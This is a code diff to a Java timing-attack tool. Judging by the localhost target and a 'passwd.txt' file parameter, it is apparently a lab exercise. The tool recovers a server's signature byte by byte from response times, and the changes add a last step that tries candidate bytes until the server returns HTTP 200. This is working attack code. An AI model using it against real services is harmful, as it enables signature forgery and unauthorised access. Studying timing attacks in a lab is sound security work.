@@ -10,7 +10,7 @@ import java.util.Comparator;
 public class TimingAttackRobust {
   public static String signature = "";
   public static String file = "passwd.txt";
-	public static final int MAX_COUNT = 10;
+	public static final int MAX_COUNT = 8;
   public static long[] maxTimes = new long[20];
   public static long[] avgTimes = new long[20];
   public static int PICK = 10;
@@ -21,7 +21,14 @@ public class TimingAttackRobust {
     String signatureString = "signature=" + signature;
     return fileString + "&" + signatureString;
   }
-  
+
+  public static int getResponseCode(String signature) throws IOException {
+    String spec = "http://localhost:5000/test?" + requestQuery(signature);
+    ServerConnection connection = new ServerConnection(spec, "GET");
+    int statusCode = connection.readResponseCode();
+    return statusCode;
+  }
+
   public static String sendRequest(String signature) throws IOException {
     // send request to server
     String spec = "http://localhost:5000/test?" + requestQuery(signature);
@@ -38,7 +45,7 @@ public class TimingAttackRobust {
 
     long maxTiming = 0, sumTime = 0;
     byte x = 0;
-    int padLength = Math.max(0, 18 - signature.length());
+    int padLength = Math.max(0, 38 - signature.length());
     String padding = "0".repeat(padLength);
 
     long[] timings = new long[MAX_COUNT];
@@ -89,6 +96,7 @@ public class TimingAttackRobust {
       f = Hex.hexEncoder((byte) timings[i].bytes);
       g = signature + f;
       res = bruteForce(g, false);
+      if (res.averageTime < 0) throw new ByteNotFoundException("Something is wrong. Getting minus average time. \nExiting...");
       if (res.averageTime > averageTime + WINDOW) {
         System.out.println("Found correct bytes: " + f);
         // update signature
@@ -103,14 +111,39 @@ public class TimingAttackRobust {
   }
 
   public static void attack() throws IOException, ByteNotFoundException {
+    String g;
+    int statusCode;
     System.out.println("INIT Timing with signature: " + signature);
     Timing f = bruteForce(signature, false); // init timing value
     System.out.println("Init Done!");
     System.out.println("Bruteforce signature initiated...");
-    for (int i = (signature.length() / 2) + 1; i <= 20; i++ ) {
+    for (int i = (signature.length() / 2) + 1; i < 20; i++ ) {
       f = getBytes(f.timing, f.averageTime);
       System.out.println("Finding next bytes...");
     }
+
+		// Find the last bytes
+    Comparator<Pair> c = Collections.reverseOrder(Comparator.comparingLong((o) -> o.timing));
+    // sort in reverse order
+    Arrays.sort(f.timing, c);
+    for (int i = 0; i < PICK; i++) {
+      System.out.println("Bytes: " + f.timing[i].bytes + " ,timing: " + f.timing[i].timing);
+    }
+
+		for (int i = 0; i < 10; i++) {
+      g = Hex.hexEncoder((byte)f.timing[i].bytes);
+      System.out.println("Final signature: " + (signature + g));
+      statusCode = getResponseCode(signature + g);
+      System.out.println(statusCode);
+      if (statusCode == 200) {
+        System.out.println("Found the last byte:" + g);
+        signature += g;
+        return;
+      }
+		}
+
+    System.out.println("Something is wrong!");
+    System.exit(-1);
   }
 
   
